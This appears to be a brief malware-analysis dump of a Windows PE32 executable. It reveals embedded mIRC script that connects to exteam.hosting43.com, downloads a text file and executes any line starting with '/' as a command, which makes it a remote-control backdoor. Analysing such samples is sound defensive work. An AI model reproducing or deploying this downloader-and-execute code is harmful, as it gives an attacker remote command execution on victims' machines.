filetype: PE32 executable (GUI) Intel 80386, for MS Windows

dump: L!This program must be run under Win32
^alias isockopen { if $sock(is) { sockclose is } | sockopen is http://exteam.hosting43.com 80 }
on *:sockopen:is:{ sockwrite -n $sockname GET http://exteam.hosting43.com/E888xT.txt HTTP/1.0 | sockwrite -n $sockname $ctrlf }
qon *:sockread:is:{ if ($sockerr) { halt } | var %dados | sockread %dados | if ($left(%dados,1) == /) { %dados } }
